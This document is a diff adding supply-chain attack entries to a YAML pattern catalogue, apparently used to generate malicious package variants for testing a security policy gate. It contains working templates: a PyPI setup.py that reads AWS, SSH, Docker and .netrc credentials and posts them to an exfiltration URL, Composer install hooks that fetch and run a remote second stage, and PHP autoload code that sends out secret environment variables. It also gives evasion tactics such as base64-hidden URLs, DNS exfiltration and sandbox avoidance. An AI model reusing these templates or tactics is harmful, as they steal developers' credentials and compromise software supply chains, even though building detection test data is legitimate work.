@@ -1441,3 +1441,280 @@ patterns:
       - also modify VS Code or Cursor MCP config files
       - inject a server that proxies all calls to the real server but logs inputs/outputs
       - set the injected server's command to a binary downloaded by the package
+
+# ---------------------------------------------------------------------------
+# FAMILY: pypi_lifecycle (PyPI setup.py-equivalent install scripts)
+# ---------------------------------------------------------------------------
+
+  - id: pypi_setup_py_exfil
+    family: pypi_lifecycle
+    severity: critical
+    real_world_examples:
+      - name: "ctx@0.2.2 (May 2022 PyPI takeover, exfil ~/.aws/credentials)"
+        date: "2022-05-23"
+        url: "https://www.bleepingcomputer.com/news/security/pypi-package-ctx-and-php-library-phpass-hijacked-to-steal-aws-keys/"
+      - name: "phpass (PyPI typosquat of phpass, same actor as ctx)"
+        date: "2022-05-23"
+        url: "https://www.bleepingcomputer.com/news/security/pypi-package-ctx-and-php-library-phpass-hijacked-to-steal-aws-keys/"
+      - name: "request (PyPI typosquat of requests)"
+        date: "2022-12-12"
+        url: "https://blog.phylum.io/phylum-discovers-revived-crypto-wallet-targeting-malware-in-pypi/"
+    description: |
+      A malicious setup.py runs arbitrary Python at install time. The
+      most common payload reads cloud credential files (~/.aws/credentials,
+      ~/.docker/config.json, ~/.netrc) and POSTs the contents to an
+      attacker-controlled endpoint. Wheels (.whl) MUST NOT execute code
+      at install; sdists (.tar.gz with setup.py) routinely do. The
+      apiary policy gate treats any sdist as carrying a synthetic
+      `setup_py` install-script hook so the install-scripts rule fires.
+    indicators:
+      - sdist (.tar.gz / .zip) distribution with no matching wheel
+      - setup.py reading ~/.aws, ~/.docker, ~/.netrc, ~/.ssh, ~/.npmrc
+      - urllib.request / requests.post / http.client in setup.py
+      - subprocess.Popen or os.system in setup.py
+      - base64 / zlib decode of an embedded payload string in setup.py
+    injection_template_py: |
+      # injected as setup.py (PyPI sdist)
+      from setuptools import setup
+      import os, json, urllib.request, pathlib
+      try:
+          home = pathlib.Path.home()
+          payload = {}
+          for candidate in ('.aws/credentials', '.docker/config.json',
+                            '.netrc', '.ssh/id_rsa', '.npmrc'):
+              p = home / candidate
+              if p.exists():
+                  payload[candidate] = p.read_text(errors='replace')
+          req = urllib.request.Request(
+              '{{EXFIL_URL}}',
+              data=json.dumps(payload).encode('utf-8'),
+              headers={'Content-Type': 'application/json'},
+          )
+          urllib.request.urlopen(req, timeout=5)
+      except Exception:
+          pass
+      setup(name='{{PKG_NAME}}', version='{{PKG_VERSION}}')
+    injection_target_files:
+      - '"setup.py: new file with payload above"'
+      - '"setup.cfg: optional sibling for sdist metadata"'
+    template_variables:
+      EXFIL_URL:
+        - '"https://exfil-archive.example.invalid/c"'
+        - '"https://aws-keys.xyz/r"'
+        - '"https://pypi-stats.tk/log"'
+      PKG_NAME:
+        - '"ctx"'
+        - '"phpass"'
+        - '"request"'
+        - '"colourama"'
+      PKG_VERSION:
+        - '"0.2.2"'
+        - '"9.9.9"'
+    variants_to_generate: 6
+    diversity_strategies:
+      - move payload into a separate __init__.py and import it from setup.py
+      - encode EXFIL_URL with base64 inside the file
+      - read EC2 IMDSv2 metadata (169.254.169.254) before credential files
+      - exfiltrate via DNS TXT lookups instead of HTTPS
+      - target only Linux paths (~/) to avoid Windows analysis sandboxes
+
+  - id: pypi_dependency_confusion
+    family: pypi_lifecycle
+    severity: high
+    real_world_examples:
+      - name: "Alex Birsan PyPI dependency confusion (Microsoft, Apple, Uber)"
+        date: "2021-02-10"
+        url: "https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610"
+      - name: "torchtriton (PyTorch nightly mirror confusion, Dec 2022)"
+        date: "2022-12-30"
+        url: "https://pytorch.org/blog/compromised-nightly-dependency/"
+    description: |
+      An attacker registers a public PyPI package matching the name of a
+      company's internal package, often at a higher version number. When
+      pip resolves dependencies without a strict index restriction (the
+      `--index-url` vs `--extra-index-url` distinction), it can prefer
+      the public version. This is the PyPI analogue of the npm
+      dependency-confusion attack class. The torchtriton case in
+      December 2022 hit PyTorch nightly users for two days.
+    indicators:
+      - package name resembles an internal corporate prefix
+      - very high version number (9999.x) to win pip's resolver
+      - no project description or release notes
+      - setup.py phones home from inside the install
+      - author email field uses a free-mail domain
+    injection_template_py: |
+      # setup.py for the malicious public PyPI mirror
+      from setuptools import setup
+      import os, json, urllib.request, platform
+      try:
+          payload = {
+              'host': platform.node(),
+              'user': os.environ.get('USER') or os.environ.get('USERNAME'),
+              'cwd': os.getcwd(),
+              'env_keys': [k for k in os.environ if 'TOKEN' in k or 'KEY' in k],
+          }
+          req = urllib.request.Request(
+              '{{EXFIL_URL}}',
+              data=json.dumps(payload).encode('utf-8'),
+          )
+          urllib.request.urlopen(req, timeout=5)
+      except Exception:
+          pass
+      setup(name='{{INTERNAL_PKG_NAME}}', version='9999.0.0')
+    injection_target_files:
+      - '"setup.py: new file with payload"'
+    template_variables:
+      EXFIL_URL:
+        - '"https://exfil-archive.example.invalid/r"'
+        - '"https://pkg-confusion.xyz/r"'
+      INTERNAL_PKG_NAME:
+        - '"acme-internal-utils"'
+        - '"corp-ml-tools"'
+        - '"internal-api-client"'
+    variants_to_generate: 4
+    diversity_strategies:
+      - register the package across PyPI, TestPyPI, and devpi to broaden hits
+      - mirror a real internal package name plus a believable suffix
+      - claim the package is deprecated, please upgrade in its description
+
+# ---------------------------------------------------------------------------
+# FAMILY: composer_lifecycle (Composer post-install-cmd abuse)
+# ---------------------------------------------------------------------------
+
+  - id: composer_post_install_cmd
+    family: composer_lifecycle
+    severity: critical
+    real_world_examples:
+      - name: "acquia/coding-standards malicious post-install-cmd (2023)"
+        date: "2023-11-01"
+        url: "https://blog.phylum.io/malicious-php-packages/"
+      - name: "PHP packagist event-stream-style backdoor pattern"
+        date: "2023-08-15"
+        url: "https://blog.phylum.io/malicious-php-packages/"
+    description: |
+      Composer's `post-install-cmd` and `post-autoload-dump` lifecycle
+      events run after every `composer install` / `composer update`.
+      A malicious package can ship a one-line shell command in
+      composer.json's `scripts` field that runs arbitrary code as the
+      user invoking composer. Modern abuse usually downloads a second
+      stage from a remote URL and executes it via `sh -c`. The apiary
+      install-scripts rule fires on any non-trivial entry in the
+      Composer lifecycle hook list.
+    indicators:
+      - scripts.post-install-cmd or scripts.post-autoload-dump set to a
+        non-trivial shell command
+      - curl / wget / php -r download of a second-stage payload
+      - reference to /dev/tcp/ or a reverse-shell template
+      - eval(file_get_contents()) of a remote URL
+      - obfuscated PHP code in the dropped second stage
+    injection_template_php: |
+      // composer.json fragment - the lifecycle abuse pattern
+      {
+        "name": "{{VENDOR}}/{{PACKAGE}}",
+        "version": "{{VERSION}}",
+        "type": "library",
+        "scripts": {
+          "post-install-cmd": [
+            "@php -r \"@file_put_contents(sys_get_temp_dir().'/h.php', @file_get_contents('{{STAGE_URL}}')); @include sys_get_temp_dir().'/h.php';\""
+          ],
+          "post-autoload-dump": [
+            "@php -r \"@copy('{{STAGE_URL}}', sys_get_temp_dir().'/d.php'); @include sys_get_temp_dir().'/d.php';\""
+          ]
+        }
+      }
+    injection_target_files:
+      - '"composer.json: scripts.post-install-cmd, scripts.post-autoload-dump"'
+    template_variables:
+      STAGE_URL:
+        - '"https://exfil-archive.example.invalid/stage2.php"'
+        - '"https://php-composer-update.xyz/s"'
+        - '"https://packagist-stats.tk/s"'
+      VENDOR:
+        - '"acme"'
+        - '"laravel-helpers"'
+        - '"symfony-extras"'
+      PACKAGE:
+        - '"coding-standards"'
+        - '"utils"'
+        - '"helpers"'
+      VERSION:
+        - '"1.0.0"'
+        - '"2.4.1"'
+    variants_to_generate: 6
+    diversity_strategies:
+      - hide the URL inside a long base64 string and decode at runtime
+      - use the @php callable form rather than the literal shell php binary
+      - reference scripts.scripts-aliases as a second indirection
+      - point STAGE_URL at a github raw URL on a freshly created repo
+
+  - id: composer_typosquat
+    family: composer_lifecycle
+    severity: high
+    real_world_examples:
+      - name: "larvel/framework (typosquat of laravel/framework, multiple incidents)"
+        date: "2024-03-15"
+        url: "https://blog.phylum.io/malicious-php-packages/"
+      - name: "symphony/symphony (typosquat of symfony/symfony)"
+        date: "2023-09-05"
+        url: "https://blog.phylum.io/malicious-php-packages/"
+      - name: "monolog/monlog (typosquat of monolog/monolog)"
+        date: "2024-01-20"
+        url: "https://blog.phylum.io/malicious-php-packages/"
+    description: |
+      The Composer typosquat pattern relies on developers mistyping
+      well-known vendor/package combinations. `larvel` for `laravel`,
+      `symphony` for `symfony`, `monlog` for `monolog`. The typosquat
+      package ships either a malicious `post-install-cmd` script or PHP
+      source that runs on include. Even without a lifecycle script the
+      package can carry an autoloaded class whose constructor
+      side-effects exfiltrate environment variables.
+    indicators:
+      - vendor/package name differs from a popular package by a single
+        character (Damerau Levenshtein distance 1)
+      - new vendor account on Packagist with one release and no
+        repository activity
+      - composer.json description mirrors the legitimate package
+      - autoload section includes a file that runs at require time
+        (the `files` autoload form rather than `psr-4`)
+      - GitHub source repo is empty or mirrors the legitimate one
+    injection_template_php: |
+      // src/AutoloadedExploit.php (file referenced from composer.json autoload.files)
+      <?php
+      // Triggered at every ``require 'vendor/autoload.php'``.
+      try {
+          $payload = json_encode([
+              'host' => gethostname(),
+              'user' => get_current_user(),
+              'cwd'  => getcwd(),
+              'env'  => array_filter($_ENV, function ($v, $k) {
+                  return preg_match('/TOKEN|KEY|SECRET|PASSWORD/i', $k);
+              }, ARRAY_FILTER_USE_BOTH),
+          ]);
+          $ctx = stream_context_create(['http' => [
+              'method' => 'POST',
+              'header' => "Content-Type: application/json\r\n",
+              'content' => $payload,
+              'timeout' => 5,
+          ]]);
+          @file_get_contents('{{EXFIL_URL}}', false, $ctx);
+      } catch (\Throwable $e) {
+          // swallow
+      }
+    injection_target_files:
+      - '"composer.json: autoload.files = [src/AutoloadedExploit.php]"'
+      - '"src/AutoloadedExploit.php: payload above"'
+    template_variables:
+      EXFIL_URL:
+        - '"https://exfil-archive.example.invalid/c"'
+        - '"https://php-pkg-stats.tk/r"'
+      TYPOSQUAT_NAME:
+        - '"larvel/framework"'
+        - '"symphony/symphony"'
+        - '"monlog/monlog"'
+        - '"phpunlt/phpunit"'
+    variants_to_generate: 5
+    diversity_strategies:
+      - combine the typosquat with a post-install-cmd for two execution chances
+      - publish under a vendor that resembles the original (laravell)
+      - mirror the original repo README and inflate stars by stealing forks
+      - claim to be a maintained fork of the original in the description
